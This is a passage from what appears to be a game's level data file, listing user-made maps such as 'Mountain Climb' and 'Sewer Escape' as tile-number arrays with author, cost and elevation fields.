lvl1",author="chinny",id="#1664981660",direction="forward",cost=352,elevation=19,map=[1,1,1,1,1,1,1,1,1,2,2,1,1,1,1,1,1,1,1,1,1,35,35,27,34,27,34,26,33,5,5,33,5,33,5,33,5,5,5,1,1,35,35,27,34,27,34,26,33,5,47,33,5,33,5,33,5,32,32,1,1,49,95,5,5,5,5,5,5,5,5,5,5,5,5,5,5,32,32,1,1,28,28,5,5,41,5,40,5,5,5,5,40,5,39,5,5,35,95,1,1,35,35,5,5,41,5,40,5,5,5,5,40,5,39,5,5,31,31,1,1,28,28,36,36,1,1,1,5,5,41,41,1,1,1,38,38,5,5,1,1,5,5,41,41,1,1,1,5,5,5,5,1,1,1,5,5,31,31,1,1,28,28,36,56,1,1,1,5,5,34,34,1,1,1,37,37,5,5,1,1,5,5,5,5,37,5,37,5,5,5,5,35,5,36,5,5,31,31,1,1,28,28,40,5,37,5,37,5,5,5,5,35,5,36,5,5,5,5,1,1,28,28,40,29,41,29,42,29,5,5,29,5,29,5,29,36,30,30,1,1,5,5,40,29,41,29,42,29,45,5,29,5,29,5,29,36,30,30,1,24,24,24,24,24,24,24,24,105,105,105,105,1,1,1,1,1,1,1,1,97,24,24,24,24,24,24,24,96,96,96,96,24,100,0,0,0,0,0,0,24,24,24,24,24,24,24,24,105,105,105,105,24,24,0,0,0,0,0,0,0,0,0,0,0,0,24,24,141,141,141,141,24,24,0,0,0,0,0,0,0,0,0,0,0,0,24,24,24,24,24,24,24,24,0,0,0,0,0,0,0,0,0,0,0,0,24,24,24,24,24,24,24,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0]});
maps.push({name="dare",author="chinny",id="#1664983193",direction="forward",cost=294,elevation=0,map=[0,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,2,2,14,0,0,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,0,0,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,0,0,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,0,0,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,0,0,0,0,0,0,0,0,0,0,20,79,79,20,0,0,14,14,14,14,0,0,0,0,0,0,0,0,0,0,20,79,79,20,0,0,14,14,14,14,0,0,0,0,0,0,0,0,0,0,20,79,79,20,0,0,14,14,14,14,0,0,0,0,0,0,0,0,0,0,20,79,79,20,0,0,14,14,14,14,0,0,0,0,0,0,0,0,0,0,20,79,79,20,0,0,14,14,14,14,0,0,0,0,0,0,0,0,0,0,20,79,79,20,0,0,14,14,14,14,0,0,0,0,0,0,0,0,0,0,20,79,79,20,0,0,14,14,14,14,0,0,0,0,0,0,0,0,0,0,20,79,79,20,0,0,14,14,14,14,0,0,0,0,0,0,0,0,0,0,20,79,79,20,0,0,14,14,14,14,0,0,0,0,0,0,0,0,0,0,20,79,79,20,0,0,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,14,14,14,14,14,14,14,14,14,14,3,9,3,14,0,0,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,0,0,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,0,0,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,2,2,14,0]});
maps.push({name="Diddling Turtles",author="Luffaren",id="#1664989332",direction="forward",cost=254,elevation=10,map=[0,0,0,0,66,66,66,66,66,2,2,66,66,66,66,66,0,0,0,0,0,0,0,0,66,66,66,66,66,66,66,66,66,66,66,66,0,0,0,0,0,0,0,0,14,14,14,14,14,14,14,14,14,14,14,14,0,0,0,0,0,0,0,0,14,94,94,14,17,14,14,18,14,14,14,14,0,0,0,0,0,0,0,0,1,1,1,1,1,16,16,1,1,1,1,1,0,0,0,0,0,0,0,0,1,1,1,1,1,14,14,1,1,1,1,1,0,0,0,0,0,0,0,0,14,14,14,14,14,14,14,14,14,19,93,14,0,0,0,0,0,0,0,0,14,14,14,14,14,14,14,14,14,14,21,14,0,0,0,0,0,0,0,0,14,14,14,14,14,14,14,14,14,14,14,14,0,0,0,0,0,0,0,0,14,14,15,14,14,15,15,14,14,15,14,14,0,0,0,0,0,0,0,0,14,14,16,14,14,16,16,14,14,16,14,14,0,0,0,0,0,0,0,0,14,14,17,14,14,17,17,14,14,17,14,14,0,0,0,0,0,0,0,0,14,14,18,14,14,18,18,14,14,18,14,14,0,0,0,0,0,0,0,0,14,14,14,14,14,14,14,14,14,14,14,14,0,0,0,0,0,0,0,0,14,14,18,18,18,18,18,18,18,18,14,14,0,0,0,0,0,0,0,0,14,14,14,14,14,18,18,14,14,14,14,14,0,0,0,0,0,0,0,0,14,14,14,14,14,18,18,14,14,14,14,14,0,0,0,0,0,0,0,0,14,14,14,14,24,140,140,24,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,24,140,140,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,2,2,24,0,0,0,0,0,0,0,0]});
maps.push({name="Defend Boost",author="Namae",id="#1664999088",direction="forward",cost=138,elevation=0,map=[0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,90,5,5,90,5,5,5,0,0,0,0,5,94,0,0,0,0,0,0,5,5,5,5,5,5,5,129,0,0,0,0,5,5,0,0,0,0,0,0,5,5,5,5,5,5,5,5,0,0,0,0,5,131,0,0,0,0,0,0,5,5,5,5,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,5,5,5,90,0,0,0,0,0,0,93,5,0,5,0,5,5,5,5,90,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,5,90,5,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,5,5,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,90,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,1,0,0,0,0,0,0,0,0,0,5,5,91,5,5,5,5,0,0,5,5,1,0,0,0,0,0,0,0,0,5,5,91,5,5,5,5,0,5,5,132,1,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,1,0,0,0,0]});
maps.push({name="Mountain Climb",author="sivi",id="#1665001175",direction="left",cost=514,elevation=19,map=[0,0,0,0,20,19,19,18,5,2,2,6,6,0,0,0,0,0,0,0,0,0,22,21,20,19,19,17,5,5,6,6,6,5,0,0,0,0,0,0,24,23,22,21,20,19,18,17,16,5,6,6,6,5,5,0,0,0,0,0,24,23,22,21,20,19,18,17,16,16,15,6,6,5,5,5,5,0,0,0,24,24,24,24,24,24,18,17,16,16,15,14,14,5,5,5,5,5,0,0,2,24,24,24,24,24,24,17,16,15,15,14,14,14,6,6,6,6,0,0,2,24,24,24,24,24,24,24,24,14,14,14,14,14,14,6,6,6,6,0,24,24,76,76,76,76,24,24,24,14,76,76,76,76,14,6,5,5,5,0,24,76,76,76,76,76,76,76,77,76,76,14,76,76,14,5,5,5,5,0,24,76,76,76,76,76,76,76,77,76,76,76,76,76,14,5,5,75,75,77,24,76,76,76,76,76,76,76,77,76,14,76,76,76,77,75,75,75,75,77,24,76,76,76,76,76,76,76,77,76,76,76,14,76,77,75,75,75,5,0,24,76,76,76,76,76,76,76,77,76,76,76,76,76,14,5,5,5,5,0,24,24,76,76,76,76,76,24,24,76,76,14,76,76,14,6,6,6,6,0,24,24,24,24,24,24,24,24,24,14,76,76,76,14,14,6,6,6,0,0,24,24,93,93,24,24,14,141,14,14,14,14,14,14,6,5,5,6,0,0,0,24,24,24,24,0,94,94,10,11,12,13,13,6,6,5,5,0,0,0,0,0,0,0,0,0,10,10,10,11,12,13,6,5,5,5,5,0,0,0,0,0,0,0,0,0,10,10,9,8,8,7,6,5,5,5,0,0,0,0,0,0,0,0,0,0,0,10,9,8,7,7,6,5,5,0,0,0,0,0]});
maps.push({name="Mountain Pass",author="sivi",id="#1665054858",direction="forward",cost=438,elevation=2,map=[0,0,0,0,1,1,1,1,1,1,1,1,1,1,1,1,1,2,2,105,0,0,0,1,1,107,107,107,106,105,1,1,1,0,0,0,0,105,105,105,0,0,0,1,90,107,107,107,106,105,105,105,44,67,0,0,0,105,105,105,0,0,0,1,107,107,107,107,106,105,90,105,44,67,0,0,1,105,90,105,0,0,0,1,107,107,107,1,1,105,105,105,44,67,0,0,105,105,105,105,1,1,1,1,90,107,107,107,1,105,105,1,1,1,0,0,105,105,105,105,1,24,65,67,65,107,107,90,1,105,105,1,1,0,0,105,105,105,105,1,1,24,65,67,65,65,65,107,1,105,90,105,44,67,0,105,90,105,0,0,1,24,65,67,65,65,65,67,1,105,105,105,44,67,0,105,105,105,44,67,1,24,65,67,65,65,65,67,1,105,105,105,44,67,0,105,105,105,44,67,1,24,65,67,65,65,65,67,1,90,105,1,1,0,0,105,105,105,44,67,1,24,65,67,65,65,65,67,1,105,105,105,1,0,0,105,90,105,0,0,1,24,65,67,65,65,65,67,1,105,105,105,44,67,0,105,105,105,105,1,1,24,65,67,65,65,65,107,1,105,90,105,44,67,0,1,105,105,105,1,1,24,65,67,65,107,107,90,1,105,105,105,44,67,0,0,105,105,105,1,1,1,1,1,107,107,107,107,1,105,105,105,1,1,1,105,105,90,105,1,0,0,0,1,90,107,107,93,1,90,105,105,90,105,105,105,105,105,105,1,0,0,0,1,107,107,107,107,1,1,105,105,105,105,105,105,105,105,1,1,0,0,0,1,1,107,107,90,1,1,1,105,105,105,105,90,105,1,1,0,0,0,0,0,1,2,2,1,1,0,1,1,1,1,1,1,1,1,0,0]});
maps.push({name="Volcano Escape",author="sivi",id="#1665226767",direction="forward",cost=690,elevation=9,map=[0,0,0,0,0,0,0,0,0,0,77,77,77,77,77,5,5,2,2,5,0,0,0,0,0,0,0,0,0,77,75,5,75,5,75,5,5,5,90,5,0,0,77,77,0,5,5,5,5,5,75,75,75,75,75,75,90,5,5,1,0,77,75,75,5,5,85,5,90,5,5,75,5,75,5,75,1,1,1,1,77,75,5,75,5,90,5,5,5,85,5,75,75,77,77,77,1,93,93,1,77,75,75,75,75,5,5,85,5,5,90,5,1,76,76,76,76,76,76,1,77,5,75,5,75,75,90,5,141,141,5,1,1,76,22,76,76,76,76,1,77,75,75,75,75,77,1,1,114,114,1,1,22,76,76,76,22,76,76,1,77,75,5,75,77,76,76,14,76,76,76,77,76,76,76,76,76,76,22,1,0,5,5,5,1,76,76,76,76,14,76,77,76,76,22,76,76,76,76,1,0,5,90,5,1,76,14,76,76,76,76,77,76,76,76,76,22,76,76,1,77,75,5,5,1,76,76,76,76,125,76,77,76,22,76,76,76,76,76,1,77,75,75,75,77,76,76,14,76,76,76,77,76,76,76,76,76,22,76,1,77,75,5,75,77,76,76,76,76,14,76,77,76,76,76,22,76,76,76,1,77,75,75,75,77,76,14,76,76,76,76,1,1,94,94,1,1,122,122,1,0,5,5,5,5,1,1,1,1,1,1,1,1,1,1,1,15,15,15,1,0,5,90,5,6,7,8,90,10,10,11,12,13,14,90,14,14,15,90,1,0,0,5,6,90,7,8,9,10,10,90,12,13,14,14,14,14,15,15,1,0,0,0,6,7,7,8,9,9,10,11,12,13,13,14,14,14,14,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,90,2,2,14,1,1,0]});
maps.push({name="skinny silly",author="chinny",id="#1665243366",direction="left",cost=394,elevation=14,map=[1,1,1,1,1,1,1,1,1,1,1,2,2,1,1,1,1,1,1,1,1,16,104,16,109,9,9,9,9,9,9,9,9,9,9,99,9,9,9,1,1,16,16,16,109,99,9,9,9,94,9,9,9,9,9,9,9,94,9,1,1,16,93,16,109,9,9,9,9,9,9,9,9,9,9,9,9,9,9,1,1,16,16,16,109,89,9,97,9,9,99,9,99,9,9,9,9,97,9,1,1,16,93,16,109,9,9,9,9,9,9,9,9,9,9,99,9,9,9,1,1,16,16,16,109,9,9,9,9,9,9,9,9,9,9,9,9,89,9,1,1,16,16,16,109,9,99,9,9,9,99,9,9,9,9,9,9,9,9,1,1,16,16,16,109,9,9,9,9,9,9,9,9,99,9,9,97,9,9,1,1,16,16,16,109,9,9,9,9,99,9,9,9,9,9,9,9,9,9,1,1,16,16,16,109,97,9,89,9,9,9,94,9,9,89,9,9,9,9,1,1,16,16,16,109,9,9,9,9,9,9,9,9,9,9,9,99,9,94,1,1,16,16,16,109,109,109,109,9,99,9,9,99,9,9,9,9,9,9,1,1,91,91,91,16,16,16,16,16,16,24,24,24,24,24,24,96,96,24,1,1,91,91,91,16,16,16,16,16,16,15,14,13,12,11,10,9,9,24,1,1,91,91,91,16,16,16,16,16,16,15,14,13,12,11,10,9,9,24,1,1,1,1,1,1,1,1,1,103,103,1,1,1,1,1,1,1,1,1,1,2,23,22,21,20,19,18,17,16,16,0,0,0,0,0,0,0,0,0,0,2,23,22,21,20,19,18,17,16,16,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="the best one",author="chinny",id="#1665243398",direction="forward",cost=822,elevation=0,map=[74,74,74,24,76,76,76,119,119,2,2,119,119,76,76,76,24,74,74,74,74,74,74,24,76,76,119,119,76,76,76,76,119,119,76,76,24,74,74,74,74,74,74,24,76,119,119,119,76,76,76,76,119,119,119,76,24,74,74,74,74,74,74,24,119,119,119,76,0,0,0,0,76,119,119,119,24,74,74,74,74,74,74,24,119,119,76,0,119,0,0,119,0,76,119,119,24,74,74,74,74,74,74,24,119,76,0,0,119,119,119,119,119,0,76,119,24,74,74,74,74,74,74,24,119,76,0,119,119,119,119,0,0,0,76,119,24,74,74,74,74,74,74,24,119,76,0,0,119,119,119,119,119,0,76,119,24,74,74,74,74,74,74,24,119,119,76,0,119,0,0,119,0,76,119,119,24,74,74,74,74,74,74,24,119,119,119,76,0,0,0,0,76,119,119,119,24,74,74,74,74,74,74,24,119,119,119,119,76,76,76,76,119,119,119,119,24,74,74,74,74,74,74,24,76,119,119,119,76,76,76,76,119,119,119,76,24,74,74,74,74,74,74,24,76,76,119,119,76,76,76,76,119,119,76,76,24,74,74,74,74,74,74,24,76,76,119,119,76,76,76,76,119,119,76,76,24,74,74,74,74,74,74,24,76,76,119,119,76,76,76,76,119,119,76,76,24,74,74,74,74,74,74,24,76,76,119,119,76,76,76,76,119,119,76,76,24,74,74,74,74,74,74,24,76,76,119,119,76,76,76,76,119,119,76,76,24,74,74,74,74,74,74,24,76,76,119,119,76,76,76,76,119,119,76,76,24,74,74,74,74,74,74,24,76,76,119,119,76,76,76,76,119,119,76,76,24,74,74,74,74,74,74,24,76,76,119,119,119,2,2,119,119,119,76,76,24,74,74,74]});
maps.push({name="the worst one",author="chinny",id="#1665243421",direction="forward",cost=451,elevation=-5,map=[0,0,1,0,0,0,0,0,0,2,2,19,0,0,0,0,0,1,0,0,0,1,0,1,0,0,0,0,0,0,0,0,0,0,0,0,1,0,1,0,1,0,1,0,1,0,0,119,119,119,119,73,73,0,0,1,0,0,0,1,0,1,0,1,0,119,119,119,119,119,119,119,73,73,73,0,1,0,1,0,0,0,1,0,119,119,119,119,119,119,119,119,119,73,73,73,0,1,0,0,0,0,0,119,119,119,119,119,119,119,119,119,119,73,73,73,73,0,0,0,0,0,0,119,119,119,119,119,119,119,119,119,119,73,73,73,73,0,0,0,0,0,119,119,119,119,119,119,119,119,119,119,119,73,73,73,73,73,0,0,0,0,119,119,119,119,119,119,119,119,119,119,73,73,73,73,73,73,0,0,0,0,119,119,119,119,119,119,119,119,119,73,73,73,73,73,73,73,0,0,0,0,119,119,119,119,119,119,119,73,73,73,73,73,73,73,73,73,0,0,0,0,119,119,119,119,119,119,73,73,73,73,73,73,73,73,73,73,0,0,0,0,119,119,119,119,119,73,73,73,73,73,73,73,73,73,73,73,0,0,0,0,0,119,119,119,119,73,73,73,73,73,73,73,73,73,73,0,0,0,0,0,0,119,119,119,119,73,73,73,73,73,73,73,73,73,73,0,0,0,0,0,1,0,119,119,119,73,73,73,73,73,73,73,73,73,0,1,0,0,0,1,0,0,0,119,119,119,73,73,73,73,73,73,73,0,0,0,1,0,1,0,1,0,1,0,0,119,119,73,73,73,73,0,0,1,0,0,0,1,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,1,0,0,0,0,0,0,2,2,0,0,0,0,0,0,1,0,0]});
maps.push({name="Ledge",author="Headhunterz",id="#1665510322",direction="forward",cost=358,elevation=19,map=[1,2,2,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,5,5,5,5,5,5,5,0,0,0,1,131,5,1,1,1,1,1,1,1,94,5,5,5,5,5,0,41,0,40,0,5,5,5,0,1,1,1,1,1,1,132,5,0,5,0,41,24,24,39,0,0,0,5,5,37,1,1,1,1,1,134,5,0,0,0,41,24,24,38,0,37,37,0,5,5,0,1,1,1,1,5,0,5,41,41,24,24,24,24,24,24,36,0,0,5,0,37,1,1,1,1,5,42,24,24,24,26,5,24,24,94,24,36,0,5,1,37,1,1,1,5,5,42,24,25,5,5,5,28,5,24,24,34,34,0,1,94,1,1,1,25,24,24,5,5,5,137,5,5,5,30,24,24,24,34,34,1,1,1,0,25,24,5,5,5,0,0,0,0,5,5,32,24,91,24,44,44,1,1,5,5,24,5,97,5,0,93,24,0,5,5,5,5,24,33,33,44,1,1,5,26,24,5,5,5,0,0,0,0,5,34,24,24,24,33,0,44,1,1,26,24,24,24,42,5,5,5,5,5,5,5,24,24,32,0,0,0,1,1,26,0,27,28,24,40,40,5,5,5,36,24,24,32,32,0,1,24,1,1,5,0,0,28,24,24,24,5,38,24,24,94,24,0,0,5,1,24,1,1,1,20,0,28,28,29,24,24,24,0,24,24,31,31,5,5,1,24,1,1,5,0,20,0,0,29,24,94,24,0,24,31,0,5,5,133,1,24,1,1,136,5,1,1,0,29,29,24,24,30,30,31,5,5,1,1,1,96,1,1,1,1,1,1,1,0,0,29,30,5,5,5,94,1,1,1,24,24,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,2,2,1]});
maps.push({name="The Funny",author="Headhunterz",id="#1665511327",direction="forward",cost=459,elevation=6,map=[1,1,1,1,1,1,1,1,2,2,1,1,1,1,1,1,1,1,1,1,1,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,1,1,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,1,1,37,37,1,1,1,1,1,1,1,1,17,1,1,1,1,1,1,1,1,1,41,41,1,131,97,28,1,132,17,1,17,1,1,17,17,17,17,1,1,1,41,41,1,28,28,28,1,17,17,1,17,1,1,91,1,1,91,1,1,1,34,34,1,93,93,93,1,19,19,1,17,1,1,91,1,1,91,1,1,1,38,38,1,28,28,28,1,19,19,1,17,1,1,17,1,1,17,1,1,1,0,0,1,36,36,36,1,19,19,1,17,1,1,17,1,1,17,1,1,1,135,135,1,33,33,33,1,21,21,1,91,1,1,17,1,1,93,1,1,1,33,33,1,131,131,131,1,94,94,1,91,1,1,17,1,1,17,1,1,1,72,72,1,0,0,0,1,21,21,1,91,1,1,91,1,1,91,1,1,1,72,72,1,0,0,0,1,23,23,1,17,1,1,91,1,1,91,1,1,1,72,72,1,135,135,135,1,142,142,1,17,1,1,17,1,1,17,1,1,1,0,0,1,135,135,135,1,23,23,1,17,1,1,17,1,1,91,1,1,1,29,29,1,135,135,135,1,23,23,1,91,1,1,17,1,1,91,1,1,1,34,34,1,19,19,19,1,96,98,1,91,1,1,17,1,1,17,1,1,1,31,31,1,3,3,3,1,96,98,1,91,1,1,91,1,1,99,1,1,1,135,135,25,25,25,25,1,23,23,1,17,17,17,91,1,1,131,1,1,1,1,1,1,1,1,1,1,2,2,1,1,1,1,1,1,1,1,1,1]});
maps.push({name="Platformer",author="Headhunterz",id="#1665515405",direction="right",cost=266,elevation=7,map=[1,1,1,1,2,2,1,1,1,1,0,0,0,0,0,0,38,24,93,24,1,8,9,10,11,11,10,9,8,1,0,0,90,38,87,38,95,58,58,2,1,7,45,45,45,45,45,45,7,1,0,0,38,38,38,38,24,58,58,2,1,6,45,45,45,45,45,45,6,1,0,0,87,38,0,0,38,24,24,24,1,94,45,45,131,131,45,45,93,1,0,0,38,38,0,0,38,38,141,1,1,94,45,105,45,45,105,45,93,1,0,0,39,39,0,0,0,0,0,1,1,94,94,105,45,45,105,93,93,1,0,0,39,39,0,0,0,0,0,0,1,1,1,1,11,11,1,1,1,1,0,0,39,39,0,0,0,0,0,0,93,45,0,0,132,11,0,0,0,0,0,0,40,40,0,0,0,0,0,0,45,45,0,0,31,31,0,0,0,0,0,0,40,90,0,0,0,0,0,0,26,26,0,0,31,31,0,0,0,0,0,0,40,40,0,0,0,0,0,0,90,26,0,0,30,30,0,0,60,60,40,40,40,40,92,34,34,34,34,0,26,26,0,0,30,30,0,0,94,60,40,40,40,40,92,34,34,34,90,0,26,26,0,0,30,30,0,0,0,0,0,0,0,0,0,0,0,34,34,0,27,27,0,0,31,31,0,0,0,0,0,1,0,0,0,0,0,34,34,0,27,27,0,0,31,31,0,0,0,0,1,30,1,0,0,0,0,33,33,0,27,27,0,0,31,31,0,0,0,0,0,91,0,0,0,0,0,33,33,0,27,27,27,92,31,31,31,31,31,92,0,91,0,31,32,32,32,33,33,0,27,27,27,92,31,90,31,31,31,92,0,91,0,31,32,32,32,33,33,0,0,0,0,0,0,0,0,0,0,0,0,91,0,0,0,0,0,0,0,0]});
maps.push({name="How to dodge",author="Headhunterz",id="#1665519135",direction="right",cost=298,elevation=0,map=[0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,11,11,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,11,11,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,11,11,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,11,11,0,0,0,0,0,0,0,0,0,0,0,1,1,1,1,1,0,0,11,11,11,95,95,91,11,95,95,91,11,95,95,91,91,94,11,2,0,0,11,11,11,95,95,91,11,95,95,91,11,95,95,91,91,11,94,2,0,0,24,24,0,0,0,0,0,0,0,0,0,0,0,1,1,1,1,1,0,0,11,11,0,1,1,1,1,1,1,1,1,1,24,24,24,24,94,1,0,0,11,11,0,1,7,7,7,7,7,7,7,7,7,7,7,24,24,1,0,0,11,11,0,1,7,1,0,92,92,92,92,92,92,92,92,1,24,1,0,0,11,11,0,1,93,1,0,0,0,0,0,0,0,0,0,1,24,1,0,0,11,11,0,1,93,1,28,28,28,28,28,28,28,28,28,1,24,1,0,0,11,11,0,1,93,1,30,30,30,30,30,30,30,30,30,1,3,1,0,0,11,11,0,1,1,1,0,0,0,0,0,0,0,0,0,1,0,1,0,0,11,11,11,11,0,105,143,143,143,143,143,143,143,143,143,5,5,1,0,0,0,0,0,1,1,1,0,0,0,0,0,0,0,0,0,1,21,1,11,94,94,0,0,1,93,1,30,30,30,30,30,30,30,30,30,1,21,21,11,94,94,0,0,1,93,1,28,28,28,28,28,28,28,28,28,1,93,93,0,0,0,0,1,1,7,7,7,7,7,7,7,7,7,7,7,1,93,93]});
maps.push({name="Breathing room",author="Luffaren",id="#1665680079",direction="forward",cost=337,elevation=0,map=[0,0,0,0,0,0,0,0,1,24,24,24,24,24,5,2,2,5,0,0,24,24,24,85,24,24,24,85,24,24,89,24,24,24,5,5,5,5,5,0,24,127,24,85,24,89,24,85,24,24,24,89,23,23,65,65,65,65,65,67,24,24,24,85,24,24,24,85,24,24,24,24,22,22,65,65,65,65,65,67,0,0,0,0,0,0,0,0,1,90,24,24,21,21,5,5,5,5,65,67,0,0,0,0,0,0,0,0,0,24,24,24,20,20,65,65,65,65,65,67,0,0,0,0,0,0,0,0,0,24,24,24,19,19,65,65,65,65,65,67,0,0,0,0,0,0,0,0,0,24,89,24,18,18,5,5,5,5,65,67,0,0,0,0,0,0,0,0,0,24,24,24,17,17,65,65,65,65,65,67,0,0,0,0,0,0,0,0,0,24,24,24,16,16,65,65,65,65,65,67,0,0,0,0,0,0,0,0,0,24,24,24,15,15,5,5,5,5,5,0,0,0,0,0,0,0,0,0,0,24,14,141,14,14,90,5,5,89,5,5,65,65,65,0,0,0,0,0,0,24,14,94,14,14,5,5,5,5,5,5,65,65,65,0,0,0,0,0,0,24,14,94,14,14,5,5,125,5,5,5,65,65,65,0,0,0,0,0,0,24,14,94,14,14,5,5,5,5,5,89,65,65,65,0,0,0,0,0,0,24,14,14,88,14,90,5,5,5,5,5,65,65,65,0,0,0,0,0,0,24,24,24,24,24,5,5,89,5,5,5,65,65,65,0,0,0,0,0,0,1,1,1,1,24,5,5,5,5,5,0,5,5,5,0,0,0,0,0,0,1,1,1,1,24,89,5,5,5,0,0,2,2,5,0,0,0,0,0,0,93,93,93,93,24,5,5,5,0,0,0]});
maps.push({name="Sewer Escape",author="sivi",id="#1665751054",direction="left",cost=558,elevation=-19,map=[1,2,2,1,0,0,0,0,0,0,1,1,1,1,1,0,0,0,0,0,1,124,124,1,0,0,0,0,0,0,1,93,124,93,1,0,0,0,0,0,1,124,124,1,1,1,1,1,1,1,1,1,124,1,1,1,1,1,1,1,1,124,124,124,124,124,124,124,124,124,124,124,124,105,105,105,105,105,88,1,1,74,74,74,74,74,74,74,74,74,74,74,74,67,65,65,65,65,105,1,1,74,74,74,74,74,74,74,74,74,74,74,74,67,65,65,65,65,105,1,1,74,74,74,74,74,74,74,74,74,74,74,74,67,65,65,65,65,105,1,1,74,74,74,74,74,74,74,74,74,74,74,74,67,65,65,65,65,105,1,1,74,74,74,74,74,74,74,74,74,74,74,74,67,65,65,65,65,105,1,1,124,94,94,124,124,124,124,124,124,124,124,124,105,105,105,105,65,105,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,105,65,105,1,0,0,0,0,1,97,105,105,105,105,105,105,105,105,97,1,105,65,105,1,1,1,1,1,1,105,65,65,65,65,65,65,65,65,105,1,105,65,105,1,105,105,105,105,1,105,65,105,105,105,105,105,105,65,105,1,105,65,105,1,2,105,105,105,96,105,65,105,1,1,1,1,105,65,105,1,105,65,105,1,2,105,105,105,96,105,65,105,1,1,1,1,105,65,105,1,105,65,105,1,105,105,105,105,1,105,65,105,105,105,105,105,105,65,105,105,105,65,105,1,1,1,1,1,1,105,65,65,65,65,65,65,65,65,65,65,65,65,105,1,0,0,0,0,1,88,105,105,105,105,105,105,105,105,105,105,105,105,88,1,0,0,0,0,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1]});
maps.push({name="Follow the water",author="Luffaren",id="#1665774292",direction="right",cost=321,elevation=0,map=[0,0,0,0,1,1,2,2,1,1,1,1,114,114,1,1,114,114,1,1,0,0,0,0,1,90,114,114,90,1,1,90,114,114,114,114,114,114,90,1,0,0,0,0,1,114,114,114,114,1,1,114,38,14,39,14,14,40,114,114,0,0,0,0,1,114,114,114,114,1,1,114,14,14,43,14,14,14,114,114,0,0,0,0,1,114,89,114,114,1,1,114,16,43,100,14,14,42,114,1,0,0,0,0,1,114,114,114,114,1,1,114,14,14,43,14,14,42,114,114,0,0,0,0,1,90,114,114,90,1,1,114,89,14,14,14,14,14,114,114,0,0,0,0,1,1,65,65,1,1,1,90,114,114,114,114,114,114,90,1,0,0,0,0,0,1,65,65,1,0,1,1,114,114,1,65,65,1,1,1,0,0,0,0,1,1,65,65,1,1,0,1,114,114,1,65,65,1,0,0,0,0,0,0,1,94,114,114,94,1,0,1,114,114,1,65,65,1,1,1,0,0,0,0,1,114,114,114,114,1,1,1,114,114,96,114,114,114,114,2,0,0,0,0,1,114,114,114,114,65,65,65,114,114,96,114,114,114,114,2,0,0,0,0,1,114,114,89,114,65,65,65,114,114,1,89,114,1,1,1,0,0,0,0,1,114,114,114,114,1,1,1,1,1,1,114,114,1,0,0,0,0,0,0,1,94,114,114,94,1,1,1,1,1,1,114,114,114,0,0,0,0,0,0,1,1,1,1,1,1,93,114,93,1,1,94,114,1,0,0,0,0,0,0,0,0,0,0,0,1,114,93,114,91,114,114,114,114,0,0,0,0,0,0,0,0,0,0,0,1,93,114,93,1,1,90,90,1,0,0,0,0,0,0,0,0,0,0,0,1,1,1,1,1,1,1,1,1,0,0]});
maps.push({name="Dont miss",author="tilgep",id="#1665782894",direction="forward",cost=349,elevation=-10,map=[0,1,1,0,1,1,0,44,44,2,2,44,44,0,0,0,1,1,1,0,1,134,134,1,137,137,1,44,44,44,44,44,44,0,0,1,57,57,57,1,1,56,56,1,47,47,1,44,44,44,44,44,44,0,0,1,57,132,57,1,1,16,16,1,7,7,1,44,44,44,44,44,44,0,0,1,57,57,57,1,0,16,16,1,125,125,1,44,44,44,44,44,44,0,0,1,57,57,57,0,0,0,0,1,0,0,1,0,0,44,44,0,0,0,0,1,57,57,57,0,0,135,135,1,0,0,1,6,6,6,6,6,6,0,0,1,57,57,57,0,0,135,135,1,16,16,1,6,76,76,76,76,6,0,0,1,57,57,57,0,0,135,135,1,15,15,0,6,76,131,136,76,6,0,0,0,0,57,0,0,135,135,135,1,14,14,0,6,76,133,138,76,6,0,0,0,0,57,0,0,135,135,135,1,13,13,0,6,76,76,76,76,6,0,0,0,0,57,0,0,135,135,0,1,13,13,0,6,6,6,6,6,6,0,0,0,0,57,0,0,135,135,0,1,125,125,1,0,0,0,0,0,0,0,0